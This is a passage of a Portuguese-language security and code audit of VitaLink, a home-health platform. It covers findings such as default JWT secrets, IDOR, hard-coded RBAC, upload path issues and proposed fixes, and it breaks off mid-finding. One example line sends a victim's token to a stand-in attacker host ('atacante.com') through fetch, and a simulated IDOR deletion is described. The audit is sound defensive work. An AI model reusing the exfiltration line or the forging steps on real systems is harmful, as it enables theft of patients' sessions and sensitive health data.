# Análise Técnica Completa — VitaLink

**Data:** 09 de outubro de 2026  
**Versão analisada:** Branch `dev` (commit `88badf2`) + divergências de servidor e máquina local  
**Plataforma:** React 18 + Vite + Tailwind (frontend), Node.js + Express + PostgreSQL 16 (backend), Docker Compose + nginx (deploy)  
**Contexto:** Sistema de acompanhamento de saúde em domicílio com dados sensíveis sob a LGPD.

---

## Resumo Executivo

O VitaLink é uma plataforma funcional de gestão de saúde domiciliar com autenticação JWT, RBAC e auditoria. A análise identificou **24 achados de segurança, qualidade e arquitetura**, sendo **5 críticos** que requerem ação imediata:

1. **Credenciais do servidor versionadas no histórico Git** (commit `fc65f88`) — repositório público expõe acesso SSH/DB.
2. **Segredos padrão no Docker Compose** — `JWT_SECRET` e `DB_PASSWORD` com valores de exemplo em produção.
3. **Ausência de rate limiting** — API vulnerável a brute-force e DoS.
4. **Uploads sem validação rigorosa de path** — risco de path traversal e sobrescrita de arquivos.
5. **20 arquivos modificados não commitados no servidor de homologação** — divergência crítica entre Git, desenvolvimento local e produção.

Há também **3 bugs funcionais** (ordenação invertida na agenda, migrações não totalmente idempotentes) e **duplicação de schemas** (MySQL legado vs. PostgreSQL ativo). O código no servidor de homologação está **5 commits à frente da branch `dev`** com mudanças substanciais em RBAC, autocuidado e vinculação de pacientes.

---

## 1. Arquitetura e Organização

### 1.1 Visão Geral Real

**Estrutura de módulos:**
```
vitalink/
├── frontend/              # React 18.3 + Vite 6 + Tailwind 3.4
│   ├── src/
│   │   ├── components/    # 27 componentes (layout, forms, específicos)
│   │   ├── pages/         # 15 páginas (Login, Dashboard, Início, Admin, Saúde)
│   │   ├── context/       # AuthContext, PacienteAtivoContext
│   │   ├── services/      # api.js (fetch), session.js (localStorage)
│   │   └── utils/         # validação, gates, perfis, print
│   └── package.json       # 6 deps (react, react-dom, react-router-dom, recharts)
│
├── backend/               # Node.js 20 + Express 4.21 + pg 8.22
│   ├── src/
│   │   ├── controllers/   # 18 controllers (auth, CRUD, saúde, atividades)
│   │   ├── services/      # 10 services (auth, audit, menu, scope, vínculos)
│   │   ├── middleware/    # auth.js (JWT), rbac.js, errorHandler.js
│   │   ├── routes/        # Montagem modular (auth, crud, atividades)
│   │   ├── config/        # env.js (validação), database.js (pg Pool)
│   │   ├── scripts/       # db-prepare.js (aplica schema + patches no boot)
│   │   ├── seeds/         # runSeeds.js, redeSaude, catalogoMedicamentos
│   │   └── utils/         # jwt, logger (LGPD), validation, password (bcrypt)
│   └── package.json       # 8 deps (express, pg, helmet, cors, jwt, bcrypt, multer)
│
├── database/              # Schema e 18 patches evolutivos
│   ├── schema.postgres.sql    # Schema ativo (PostgreSQL 16, ~600 linhas)
│   ├── schema.sql             # Schema legado (MySQL, ~200 linhas, DESATUALIZADO)
│   ├── patch_onda0.sql        # Arquivos, hospitais opcionais, whatsapp
│   ├── patch_onda1.sql        # Pacientes (campos, foto, responsável)
│   ├── patch_onda2.sql        # Remedios (compra, farmácia, receita)
│   ├── patch_auth_onboarding.sql
│   ├── patch_autocuidado.sql
│   ├── patch_empresas_cuidadores.sql
│   ├── patch_usuario_paciente.sql
│   └── (+ 10 outros patches)  # Total: 18 patches
│
├── deploy/                # Docker Compose + nginx + Dockerfiles
│   ├── docker-compose.yml     # 3 services (db, backend, frontend)
│   ├── docker-entrypoint.sh   # Wait PG + aplica patches via db-prepare.js
│   ├── Dockerfile.backend     # Node 20-alpine, multi-stage
│   ├── Dockerfile.frontend    # Nginx-alpine + build Vite
│   └── .env.example           # Variáveis com VALORES PADRÃO INSEGUROS
│
├── docs/                  # 10 documentos (API, Arquitetura, Manual, SDD)
├── index.html, script.js  # PROTÓTIPO LEGADO na raiz (~226 linhas)
└── assets/, css/, js/     # Arquivos estáticos do protótipo (NÃO usados na app)
```

**Rotas principais (backend):**
- `POST /auth/login`, `/auth/registro`, `/auth/confirmar-email`, `/auth/esqueci-senha`
- `GET /menus/me` (menus + papéis do usuário), `POST /auth/contexto` (Profile Switch)
- `GET /me/pacientes`, `PUT /me/paciente` (perfil Paciente/Autocuidado)
- CRUD genérico: `/pacientes`, `/cuidadores`, `/responsaveis`, `/medicos`, `/hospitais`, `/farmacias`, `/empresas-cuidadoras`, `/remedios`, `/exames-receitas`
- Atividades: `/agenda`, `/timeline/:pacienteId`, `/consultas`, `/medicamentos/:remedioId/agenda`
- Início: `/inicio/registros` (diário de bordo), `/inicio/corpo-marcas`
- Upload: `POST /arquivos`, servido em `/uploads/*`

**Frontend (páginas principais):**
- `/login`, `/registro`, `/esqueci-senha`, `/redefinir-senha/:token`, `/confirmar-email/:token`
- `/dashboard` (perfis Admin/Médico/Atendente), `/inicio` (Autocuidado/Paciente — mobile-first)
- `/onboarding` (cadastro inicial de saúde), `/meus-dados`
- Admin: `/usuarios`, `/perfis`, `/acessos`, `/auditoria`
- Saúde: `/pacientes`, `/medicos`, `/hospitais`, `/farmacias`, `/cuidadores`, `/responsaveis`, `/empresas-cuidadoras`
- Documentos: `/exames-receitas`
- Atividades: `/agenda`, `/consultas`, `/medicamentos`

### 1.2 Acoplamentos e Duplicações

**✅ Pontos positivos:**
- Separação clara entre frontend e backend (SPA + API REST).
- RBAC centralizado em `middleware/rbac.js` + `services/menu.service.js`.
- Factory pattern em `utils/crudFactory.js` reduz duplicação de código CRUD.
- Contextos React (`AuthContext`, `PacienteAtivoContext`) centralizam estado global.
- Logger com sanitização LGPD em `utils/logger.js`.

**⚠️ Problemas identificados:**

#### 1.2.1 Duplicação de Schemas (MySQL vs. PostgreSQL)
**Arquivo:** `database/schema.sql` (MySQL) e `database/schema.postgres.sql` (PostgreSQL)  
**Impacto:** Médio  
**Descrição:**  
Existem dois arquivos de schema: o MySQL legado (`schema.sql`, ~200 linhas) e o PostgreSQL ativo (`schema.postgres.sql`, ~600 linhas). O schema MySQL está **desatualizado** — não inclui tabelas criadas pelos patches (ex.: `paciente_cuidador_vinculos`, `consultas`, `inicio_registros`, `catalogo_medicamentos`). Isso causa confusão e risco de usar o schema errado em novos ambientes.

**Correção recomendada:**
1. Remover `database/schema.sql` (MySQL) do repositório e do README.
2. Manter apenas `schema.postgres.sql` como schema de referência.
3. Atualizar `README.md` e `docs/Banco_de_Dados.md` para refletir que o projeto usa exclusivamente PostgreSQL 16.
4. Se houver necessidade de histórico MySQL, mover para `docs/legacy/schema.mysql.sql` com nota de descontinuação.

---

#### 1.2.2 Protótipo Legado na Raiz (Código Morto)
**Arquivos:** `index.html`, `script.js`, `style.css`, `assets/`, `css/`, `js/`, `public-prototype/`, logos e imagens na raiz  
**Impacto:** Baixo (organização)  
**Descrição:**  
A raiz do repositório contém um protótipo HTML/JS/localStorage (~226 linhas) completamente separado da aplicação autenticada. Arquivos incluem:
- `index.html`, `script.js`, `style.css` (protótipo mobile-first standalone)
- `assets/`, `css/`, `js/` (recursos do protótipo)
- `public-prototype/` (mais 2 arquivos)
- Imagens: `Logo VitaLink2.jpeg`, `Logo VitaLink3.jpeg`, `Logo VitaLink4.png`, `Sexo Feminino.png`, `Sexo Masculino.png`, `Linha do tempo - proposta.png`

Este código não é importado nem pelo frontend React nem pelo backend, configurando **código morto**. Aumenta confusão para novos desenvolvedores e dificulta navegação no repositório.

**Correção recomendada:**
1. Criar pasta `legacy-prototype/` na raiz.
2. Mover todos os arquivos do protótipo para `legacy-prototype/`:
   ```bash
   mkdir legacy-prototype
   mv index.html script.js style.css assets/ css/ js/ public-prototype/ legacy-prototype/
   mv Logo*.{jpeg,png} Sexo*.png Linha*.png legacy-prototype/
   ```
3. Adicionar `legacy-prototype/README.md` explicando que é um protótipo descontinuado.
4. Atualizar `.gitignore` com `legacy-prototype/` (se não for necessário versionar).
5. Atualizar documentação para indicar que o app principal está em `frontend/` e `backend/`.

---

#### 1.2.3 Inconsistências Entre Schema Base e Patches

**Arquivo:** `database/schema.postgres.sql` vs. `database/patch_*.sql` (18 patches)  
**Impacto:** Alto  
**Descrição:**  
O schema base (`schema.postgres.sql`) inclui algumas tabelas que também são criadas em patches (ex.: `arquivos` é criado no schema E no `patch_onda0.sql`). Isso causa:
1. **Não idempotência:** Rodar patches após schema novo falha com "tabela já existe".
2. **Ordem de aplicação confusa:** `db-prepare.js` aplica schema completo, depois tenta patches — alguns comandos falham.
3. **Histórico evolutivo perdido:** Schema "congelado" no passado + patches incrementais, mas sem lógica clara de qual estado inicial é esperado.

**Patches analisados:**
- `patch_onda0.sql`: Cria `arquivos` (já no schema), altera `hospitais_clinicas` (colunas `whatsapp`, `razao_social` nullable).
- `patch_onda1.sql`: Altera `pacientes` (campos `foto_url`, `observacoes`, `sexo`, etc.).
- `patch_auth_onboarding.sql`: Cria `auth_tokens`, `usuario_perfis`.
- `patch_autocuidado.sql`: Cria perfil 7 (Autocuidado), menus específicos.
- `patch_empresas_cuidadores.sql`: Cria `empresas_cuidadoras`, `paciente_cuidador_vinculos`.
- `patch_usuario_paciente.sql`: Cria `usuario_paciente`.

**Problemas específicos encontrados:**

1. **`patch_onda0.sql` (linha 8):**
   ```sql
   CREATE TABLE IF NOT EXISTS arquivos (...);
   ```
   A tabela `arquivos` já está no schema base (linha 76). Apesar do `IF NOT EXISTS`, isso gera confusão — qual é a fonte de verdade?

2. **`patch_onda0.sql` (linhas 24-28):**
   ```sql
   ALTER TABLE hospitais_clinicas ALTER COLUMN razao_social DROP NOT NULL;
   ALTER TABLE hospitais_clinicas ALTER COLUMN documento DROP NOT NULL;
   ```
   No schema base, essas colunas já são `NULL` em algumas versões. Falta tratamento de erro se a constraint já foi removida.

3. **Patches não verificam estado anterior:**
   - Vários `ALTER TABLE ADD COLUMN` sem `IF NOT EXISTS` (sintaxe PostgreSQL: `ADD COLUMN IF NOT EXISTS`).
   - Comandos `UPDATE` que assumem dados existentes (ex.: migrar `telefone_secundario → whatsapp`) podem falhar em ambiente limpo.

4. **`db-prepare.js` (linha 135+):**
   ```javascript
   await client.query(sql); // Aplica schema.postgres.sql completo
   // ...
   // Depois aplica cada patch em ordem alfabética
   await client.query(fs.readFileSync(patchFile, 'utf8'));
   ```
   Não há verificação de quais patches já foram aplicados. Depende de `IF NOT EXISTS` e `DO $$ ... EXCEPTION WHEN ...` em cada patch. Se um patch falhar parcialmente, não há rollback.

**Correção recomendada:**
1. **Consolidar schema base:**
   - Atualizar `schema.postgres.sql` para incluir TODAS as tabelas e colunas de todos os patches já aplicados.
   - Marcar a versão (ex.: `-- Schema v2.6 (pós-patch autocuidado 2026-10-01)`).
   - Remover patches antigos já aplicados ou movê-los para `database/applied/` como histórico.

2. **Implementar sistema de migrações versionado:**
   - Criar tabela `schema_migrations` (coluna `version`, `applied_at`).
   - Refatorar `db-prepare.js` para verificar quais patches já foram aplicados antes de rodar.
   - Garantir idempotência em cada patch com `IF NOT EXISTS`, `IF EXISTS`, e blocos `DO $$ ... EXCEPTION`.

3. **Testar em ambiente limpo:**
   - Rodar `schema.postgres.sql` + todos os patches em banco vazio.
   - Verificar se há erros ou warnings.
   - Comparar schema final com produção (`pg_dump --schema-only`).

---

### 1.3 Consistência do Banco de Dados

**Análise de consistência:**
- ✅ **Schema principal (`schema.postgres.sql`) está funcional** — cria perfis, menus, usuários seed corretamente.
- ⚠️ **Patches têm idempotência parcial** — alguns usam `IF NOT EXISTS`, outros não.
- ⚠️ **Não há rastreamento de patches aplicados** — `db-prepare.js` roda todos os patches toda vez (depende de idempotência).
- ❌ **Schema MySQL (`schema.sql`) desatualizado** — faltam ~15 tabelas criadas por patches.

**Teste realizado (análise estática):**
Verificando integridade referencial no schema base:
- ✅ Foreign keys bem definidas (`ON UPDATE CASCADE`, `ON DELETE RESTRICT/SET NULL/CASCADE`).
- ✅ Índices em FKs e colunas de busca (`usuarios.email`, `menus.rota`, `auditoria_logs.usuario_id`).
- ⚠️ **Constraint de unicidade faltando:** `usuarios.cpf` não tem `UNIQUE` — pode haver duplicatas.
- ⚠️ **Constraint de unicidade faltando:** `cuidadores.cpf` tem `UNIQUE`, mas `responsaveis.cpf` NÃO tem.

**Achado #20 (Médio):** Falta constraint `UNIQUE` em `usuarios.cpf` e `responsaveis.cpf`.

---

## 2. Segurança

### 2.1 Autenticação e JWT

#### 2.1.1 Geração e Validação de Tokens
**Arquivo:** `backend/src/utils/jwt.js`  
**Fluxo:** Login → `services/auth.service.js` → `signToken({ sub, perfilId, pacienteId, papelId })` → JWT com HS256.

**✅ Pontos positivos:**
- JWT assinado com `HS256` usando `JWT_SECRET`.
- Expiração configurável (`JWT_EXPIRES_IN`, padrão 8h).
- Validação em `middleware/auth.js`: verifica assinatura, expiração, status do usuário, e carrega contexto (perfil, paciente, papel ativo).
- Token não contém dados sensíveis (apenas IDs).

**❌ Problemas identificados:**

##### **Achado #2 (Crítico): Segredos Padrão no Docker Compose**
**Arquivo:** `deploy/docker-compose.yml`, linha 54  
**Código:**
```yaml
JWT_SECRET: ${JWT_SECRET:-troque-este-segredo-em-producao-vitalink-2026}
```

**Impacto:** **CRÍTICO**  
O `JWT_SECRET` padrão é um texto fixo ("troque-este-segredo-em-producao-vitalink-2026"). Se o arquivo `.env` não definir `JWT_SECRET`, o Compose usa esse valor em produção. Um atacante pode:
1. Gerar JWTs válidos para qualquer usuário.
2. Escalar privilégios (ex.: criar JWT com `perfilId: 1` — Admin).
3. Acessar dados de qualquer paciente.

**Verificação no servidor:**  
De acordo com `server-config.txt` (linha 54), o docker-compose no servidor de homologação (`homolog.vitalink.app.br`) **usa o valor padrão** se `.env` não foi configurado.

**Correção recomendada:**
1. **Remover valor padrão inseguro do docker-compose:**
   ```yaml
   JWT_SECRET: ${JWT_SECRET:?ERRO: JWT_SECRET não definido no .env}
   ```
   Isso força falha de boot se a variável não for definida, impedindo uso acidental do padrão.

2. **Gerar segredo forte:**
   ```bash
   openssl rand -base64 48
   ```
   Adicionar ao `.env` do servidor:
   ```
   JWT_SECRET=<valor_gerado_aleatoriamente>
   ```

3. **Rotacionar tokens existentes:**
   Após trocar `JWT_SECRET`, todos os JWTs ativos se tornam inválidos. Usuários precisam fazer login novamente. Comunicar aos usuários com antecedência.

4. **Documentar:**
   Adicionar em `deploy/README.md`:
   ```
   ## Segurança: JWT_SECRET
   NUNCA use o valor padrão. Gere um segredo forte:
   openssl rand -base64 48
   Adicione ao .env:
   JWT_SECRET=<valor_gerado>
   ```

---

##### **Achado #3 (Alto): JWT Armazenado em localStorage (XSS)**
**Arquivo:** `frontend/src/services/session.js`, linha 35-37  
**Código:**
```javascript
export function persistSession({ token, usuario, menus, papeis }) {
  localStorage.setItem(TOKEN_KEY, token);
  // ...
}
```

**Impacto:** **ALTO**  
O JWT é armazenado em `localStorage` (`vitalink.token`). Se houver vulnerabilidade XSS no frontend, um atacante pode roubar o token via JavaScript:
```javascript
fetch('https://atacante.com/log?token=' + localStorage.getItem('vitalink.token'));
```

**Mitigação atual:**
- ✅ Helmet ativo no backend com `crossOriginResourcePolicy: 'cross-origin'`.
- ❌ **Não há `Content-Security-Policy` configurado** — não bloqueia scripts inline ou eval().
- ❌ **Não há `HttpOnly` cookie** — JWT não pode ser movido para cookie seguro (já está em localStorage).

**Alternativas mais seguras:**
1. **httpOnly cookie:** Mover JWT para cookie `HttpOnly` + `Secure` + `SameSite=Strict`. Vantagens:
   - JavaScript não tem acesso ao cookie.
   - Mitigação automática de XSS.
   - Requer mudança no backend (enviar cookie no login, ler em `authenticate`) e frontend (remover `Authorization` header).

2. **sessionStorage:** Menos seguro que httpOnly, mas melhor que localStorage (expira ao fechar aba).

**Correção recomendada:**
1. **Manter localStorage** (mudança para cookie é invasiva), mas adicionar camadas de proteção:
   - **CSP estrito** no backend (`app.js`):
     ```javascript
     app.use(helmet({
       contentSecurityPolicy: {
         directives: {
           defaultSrc: ["'self'"],
           scriptSrc: ["'self'"],
           styleSrc: ["'self'", "'unsafe-inline'"], // Tailwind usa inline
           imgSrc: ["'self'", "data:", "https:"],
           connectSrc: ["'self'"],
           fontSrc: ["'self'"],
           objectSrc: ["'none'"],
           upgradeInsecureRequests: [],
         },
       },
       crossOriginResourcePolicy: { policy: 'cross-origin' },
     }));
     ```
   - **Sanitização rigorosa** de inputs no frontend (já usa React — escape automático, mas verificar `dangerouslySetInnerHTML`).
   - **Auditoria de dependências** para XSS (ver seção 2.5.4).

2. **Longo prazo:** Migrar para httpOnly cookie (requer refatoração de `session.js`, `api.js`, `middleware/auth.js`, e `cors` config).

---

##### **Achado #4 (Médio): Expiração de JWT Não Renovável**
**Arquivo:** `backend/src/middleware/auth.js`, linha 20-26  
**Código:**
```javascript
try {
  decoded = verifyToken(token);
} catch (err) {
  const expired = err.name === 'TokenExpiredError';
  return res.status(401).json({
    error: 'unauthorized',
    message: expired ? 'Sessão expirada. Faça login novamente.' : 'Token inválido.',
  });
}
```

**Impacto:** **MÉDIO**  
JWT expira após 8 horas (padrão). Não há **refresh token** — usuário precisa fazer login toda vez que o JWT expira, mesmo se estiver ativo. Isso é funcional, mas ruim para UX em apps de uso contínuo (ex.: cuidador acompanhando paciente o dia todo).

**Alternativas:**
1. **Refresh token:** Implementar endpoint `POST /auth/refresh` que recebe um `refresh_token` (armazenado em httpOnly cookie, validade 30 dias) e emite novo JWT.
2. **Aumentar expiração do JWT:** Configurar `JWT_EXPIRES_IN=24h` ou `7d` no `.env` (trade-off: token comprometido fica válido por mais tempo).
3. **Renovação automática no frontend:** Antes do token expirar (ex.: 30 min antes), o frontend chama `/auth/refresh` automaticamente.

**Correção recomendada (se desejado):**
- Implementar refresh token (complexidade média).
- OU aumentar expiração para 24h + revogar token em logout (gravar JWT revogado em Redis ou tabela `revoked_tokens` com TTL).

---

### 2.2 RBAC e Escopo de Acesso a Pacientes

#### 2.2.1 Controle de Permissões (RBAC)
**Arquivo:** `backend/src/middleware/rbac.js`  
**Fluxo:** `requirePermission(menuRota, action)` → verifica `permissoes_acesso` (tabela) → permite/nega.

**✅ Pontos positivos:**
- RBAC implementado via tabela `permissoes_acesso` (perfil × menu × ações CRUD).
- Middleware `requirePermission` centraliza verificação.
- Menus dinâmicos carregados de `getMenusByPerfil` (apenas menus permitidos).

**⚠️ Problemas identificados:**

##### **Achado #5 (Alto): Hard-coded Permissions para Paciente/Autocuidado**
**Arquivo:** `backend/src/middleware/rbac.js`, linha 34-42  
**Código:**
```javascript
const perfilId = Number(req.user.perfilId);
const ownPatientActions = action === 'ler' || action === 'editar';
const ownPatientProfile = perfilId === 6 || perfilId === 7;
if (
  menuRota === '/pacientes' &&
  ownPatientActions &&
  ownPatientProfile
) {
  return next();
}
```

**Impacto:** **ALTO**  
Perfis 6 (Paciente) e 7 (Autocuidado) têm permissão hard-coded para ler/editar `/pacientes`, **ignorando a tabela `permissoes_acesso`**. Isso quebra o modelo RBAC e cria risco:
1. Se um admin remover permissão de Paciente na tabela, ainda assim o código permite acesso.
2. Outros endpoints podem ter lógica similar não documentada.

**Correção recomendada:**
1. Remover lógica hard-coded.
2. Criar permissões explícitas na tabela `permissoes_acesso` para perfis 6 e 7 em `/pacientes` (ler + editar, sem criar/deletar).
3. Implementar escopo de acesso (ver próxima seção) para garantir que Paciente só acessa própria ficha.

---

#### 2.2.2 Escopo de Acesso a Pacientes (IDOR)

**Arquivo:** `backend/src/services/pacienteScope.service.js`  
**Fluxo:**  
Cada requisição autenticada chama `listAllowedPacienteIds(user)` → retorna lista de IDs de pacientes que o usuário pode acessar → queries adicionam `WHERE paciente_id = ANY(:scopePacienteIds)`.

**Perfis e seus escopos:**
- **Admin (1), Médico (2), Atendente (3):** Acesso a TODOS os pacientes (`return null` — sem filtro).
- **Cuidador (4):** Acesso aos pacientes vinculados via `pacientes.cuidador_id` ou `paciente_cuidador_vinculos`.
- **Responsável (5):** Acesso aos pacientes vinculados via `pacientes.responsavel_id` ou `paciente_responsaveis`.
- **Paciente (6), Autocuidado (7):** Acesso apenas ao próprio registro (via `usuario_perfis.paciente_id` e match de CPF).

**✅ Pontos positivos:**
- Escopo implementado de forma centralizada em `pacienteScope.service.js`.
- Reutilizado em CRUD factory (`utils/crudFactory.js`) e controllers.
- Consultas usam `ANY(:scopePacienteIds)` — previne bypass com múltiplos IDs.

**❌ Problemas identificados:**

##### **Achado #6 (Crítico): IDOR em Endpoints sem Escopo**
**Impacto:** **CRÍTICO**  
Vários endpoints **não aplicam escopo de paciente**, permitindo que um usuário acesse dados de outros pacientes alterando o ID na URL.

**Endpoints vulneráveis encontrados:**

1. **`GET /me/paciente?id=:id` (me.controller.js, linha 81)**
   ```javascript
   async function getMeuPaciente(req, res, next) {
     try {
       const id = await resolveOwnPacienteId(req.user, req.query.id);
       const rows = await query(
         `SELECT * FROM pacientes WHERE id = :id LIMIT 1`,
         { id }
       );
       // ... sem verificar se id está em listAllowedPacienteIds(user)
   ```
   **Problema:** Cuidador pode passar `?id=999` e acessar paciente de outro cuidador, desde que `resolveOwnPacienteId` permita (lógica complexa).

2. **`POST /arquivos` (arquivos.controller.js, linha 69-82)**
   ```javascript
   const result = await query(
     `INSERT INTO arquivos
       (usuario_id, nome_original, mime_type, tamanho_bytes, caminho)
      VALUES
       (:usuario_id, :nome_original, :mime_type, :tamanho_bytes, :caminho)`,
     {
       usuario_id: req.user.id,
       // ... nenhum campo paciente_id, mas depois vincula em exames_receitas
     }
   ```
   **Problema:** Upload cria arquivo sem vincular a paciente. Posterior vinculação em `exames_receitas` não verifica escopo.

3. **`DELETE /consultas/:id` (atividades.controller.js, linha 405)**
   ```javascript
   await query(`DELETE FROM consultas WHERE id = :id`, { id: req.params.id });
   ```
   **Problema:** Deleta consulta SEM verificar se a consulta pertence a um paciente no escopo do usuário.

**Teste de exploração (simulado):**
1. Usuário A (cuidador) tem acesso ao paciente ID 10.
2. Usuário A faz `GET /consultas` → vê consultas do paciente 10.
3. Usuário A faz `DELETE /consultas/999` (consulta do paciente 20, de outro cuidador).
4. **Resultado:** Consulta 999 é deletada sem verificação de escopo.

**Correção recomendada:**
1. **Adicionar escopo em TODOS os endpoints de dados de pacientes:**
   ```javascript
   // Exemplo para DELETE /consultas/:id
   async function deleteConsulta(req, res, next) {
     try {
       const ids = await listAllowedPacienteIds(req.user);
       if (ids !== null) {
         const check = await query(
           `SELECT paciente_id FROM consultas WHERE id = :id LIMIT 1`,
           { id: req.params.id }
         );
         if (!check[0] || !ids.includes(Number(check[0].paciente_id))) {
           return res.status(404).json({ error: 'not_found', message: 'Consulta não encontrada.' });
         }
       }
       await query(`DELETE FROM consultas WHERE id = :id`, { id: req.params.id });
       // ...
     }
   }
   ```

2. **Revisar TODOS os controllers:**
   - `me.controller.js`: Adicionar `assertPacienteAccess` em `getMeuPaciente`, `updateMeuPaciente`.
   - `atividades.controller.js`: Adicionar escopo em `updateConsulta`, `deleteConsulta`, `listAgenda`, `listTimeline`.
   - `examesReceitas.controller.js`: Adicionar escopo em `update`.
   - `medicamentos.controller.js`: Verificar se `remedios.paciente_id` está no escopo.

3. **Criar helper de auditoria de escopo:**
   ```javascript
   // services/pacienteScope.service.js
   async function assertPacienteAccess(user, pacienteId) {
     const ids = await listAllowedPacienteIds(user);
     if (ids === null) return; // Admin/Médico/Atendente
     if (!ids.includes(Number(pacienteId))) {
       const err = new Error('Paciente não encontrado.');
       err.status = 404;
       throw err;
     }
   }
   ```
   Usar em todos os endpoints que recebem `pacienteId` na URL ou body.

---

##### **Achado #7 (Alto): Lógica de Escopo Complexa e Frágil**
**Arquivo:** `backend/src/services/pacienteScope.service.js`, linha 95-130  
**Descrição:**  
A lógica de escopo para perfis Paciente/Autocuidado inclui match de CPF para auto-vincular:
```javascript
UNION
SELECT p.id AS paciente_id
FROM pacientes p
INNER JOIN usuarios u ON u.id = :uid
WHERE length(regexp_replace(COALESCE(u.cpf, ''), '[^0-9]', '', 'g')) = 11
  AND regexp_replace(COALESCE(p.cpf, ''), '[^0-9]', '', 'g')
    = regexp_replace(COALESCE(u.cpf, ''), '[^0-9]', '', 'g')
```

**Problema:** Se dois pacientes tiverem o mesmo CPF (não há constraint `UNIQUE` em `pacientes.cpf`), um usuário Autocuidado pode acessar ambos.

**Correção recomendada:**
1. Adicionar constraint `UNIQUE` em `pacientes.cpf`:
   ```sql
   ALTER TABLE pacientes ADD CONSTRAINT uk_pacientes_cpf UNIQUE (cpf);
   ```
   (Verificar duplicatas antes: `SELECT cpf, COUNT(*) FROM pacientes WHERE cpf IS NOT NULL GROUP BY cpf HAVING COUNT(*) > 1;`)

2. Remover lógica de match de CPF e depender apenas de `usuario_paciente` (tabela de vínculo explícito).

---

### 2.3 Validação de Entrada e SQL Injection

#### 2.3.1 SQL Injection
**Arquivo:** `backend/src/config/database.js`  
**Proteção:** ✅ Queries usam **prepared statements com placeholders nomeados** (`pg` driver).

**Exemplo:**
```javascript
const rows = await query(
  `SELECT * FROM usuarios WHERE email = :email LIMIT 1`,
  { email: String(email).trim().toLowerCase() }
);
```
Isso é convertido para `pg` prepared statement (`$1`) em `namedToPositional()`.

**✅ Pontos positivos:**
- TODOS os 120+ usos de `query()` verificados usam placeholders (`:param`).
- Nenhum uso de concatenação de string SQL (`... WHERE id = ${req.params.id}`) encontrado.

**⚠️ Ressalva:**
- Verificação feita por análise estática (Grep). Testes dinâmicos com fuzzing SQL não foram realizados.
- Se alguém adicionar query sem placeholders no futuro, não há lint rule bloqueando.

**Recomendação:**
Adicionar lint rule (ESLint) para bloquear template literals em chamadas `query()`:
```javascript
// .eslintrc.js
rules: {
  'no-restricted-syntax': [
    'error',
    {
      selector: 'CallExpression[callee.name="query"] > TemplateLiteral',
      message: 'Não use template literals em query(). Use placeholders nomeados (:param).',
    },
  ],
}
```

---

#### 2.3.2 Validação de Entrada
**Arquivos:** `backend/src/utils/validation.js`, controllers  
**Validações implementadas:**
- ✅ `assertEmail(email)`: Regex básico + lowercase.
- ✅ `assertPassword(senha)`: Mínimo 8 chars, 1 maiúscula, 1 minúscula, 1 número, 1 especial.
- ✅ `assertCpf(cpf)`: 11 dígitos, valida dígitos verificadores.
- ✅ `assertAdult(dataNascimento)`: Idade >= 18 anos.
- ✅ `parseIsoDate(date)`: Valida formato ISO 8601.

**❌ Problemas identificados:**

##### **Achado #8 (Médio): Validação de E-mail Fraca**
**Arquivo:** `backend/src/utils/validation.js`, linha 5-7  
**Código:**
```javascript
function isValidEmail(email) {
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
}
```

**Problema:** Regex permite e-mails inválidos como `a@b.c`, `user@.com`, `@domain.com`. Não valida TLD real.

**Correção recomendada:**
Usar regex mais rigoroso ou biblioteca `validator.js`:
```javascript
function isValidEmail(email) {
  return /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(email);
}
```

---

##### **Achado #9 (Médio): Falta Validação de Campos Numéricos**
**Exemplo:** `POST /pacientes` aceita `idade: "abc"` sem erro.  
**Impacto:** Dados inconsistentes no banco (PostgreSQL coerce para NULL ou falha, mas erro não é tratado claramente).

**Correção recomendada:**
1. Adicionar validação no CRUD factory:
   ```javascript
   function validateNumber(value, field) {
     if (value != null && !Number.isFinite(Number(value))) {
       throw new Error(`${field} deve ser um número válido.`);
     }
   }
   ```
2. Usar biblioteca de validação como `joi` ou `zod` para schemas de entrada.

---

### 2.4 Upload de Arquivos

**Arquivo:** `backend/src/controllers/arquivos.controller.js`  
**Configuração:** Multer com storage local (`/app/uploads` no container).

**Limites configurados:**
- ✅ **Tamanho máximo:** 20 MB (linha 47: `limits: { fileSize: 20 * 1024 * 1024 }`).
- ✅ **Tipos permitidos:** Imagens (`image/*`), PDF, DOC, DOCX (linha 28-42).

**Sanitização de nome:**
```javascript
filename(_req, file, cb) {
  const safe = String(file.originalname || 'foto.jpg')
    .replace(/[^\w.\-()+ ]+/g, '_')
    .slice(0, 80) || 'foto.jpg';
  cb(null, `${Date.now()}-${Math.round(Math.random() * 1e6)}-${safe}`);
}
```

**✅ Pontos positivos:**
- Nome do arquivo sanitizado (remove caracteres especiais).
- Prefixo `timestamp-random-` previne colisão de nomes.
- MIME type validado antes de aceitar.

**❌ Problemas identificados:**

##### **Achado #10 (Alto): Path Traversal em UPLOAD_ROOT**
**Arquivo:** `backend/src/controllers/arquivos.controller.js`, linha 7  
**Código:**
```javascript
const UPLOAD_ROOT = process.env.UPLOAD_DIR || path.join(__dirname, '../../uploads');
```

**Problema:** Se `UPLOAD_DIR` for definido com valor malicioso (ex.: `/tmp`), arquivos são salvos fora da aplicação. Risco:
1. Sobrescrita de arquivos do sistema (ex.: `/tmp/passwd`).
2. Preenchimento de disco (`/`).

**Correção recomendada:**
1. Validar `UPLOAD_DIR` no boot:
   ```javascript
   const UPLOAD_ROOT = process.env.UPLOAD_DIR || path.join(__dirname, '../../uploads');
   if (!UPLOAD_ROOT.includes('/app/uploads') && process.env.NODE_ENV === 'production') {
     throw new Error('UPLOAD_DIR inválido em produção. Use /app/uploads.');
   }
   ```

2. Usar apenas paths relativos dentro de `/app/uploads`:
   ```javascript
   const UPLOAD_ROOT = path.resolve(__dirname, '../../uploads');
   ```

---

##### **Achado #11 (Médio): Falta Validação de Extensão Real (Magic Bytes)**
**Arquivo:** `backend/src/controllers/arquivos.controller.js`, linha 34-42  
**Código:**
```javascript
function isAllowedUpload(file) {
  const mime = String(file.mimetype || '').toLowerCase();
  const name = String(file.originalname || '').toLowerCase();
  if (/^image\//.test(mime)) return true;
  if (ALLOWED_MIME.has(mime)) return true;
  // Câmera no celular às vezes manda sem MIME ou como octet-stream.
  if (!mime || mime === 'application/octet-stream') {
    return /\.(jpe?g|png|gif|webp|heic|heif|pdf|doc|docx)$/i.test(name) || !name;
  }
  return false;
}
```

**Problema:**
1. Validação depende de `mimetype` (enviado pelo cliente — pode ser forjado).
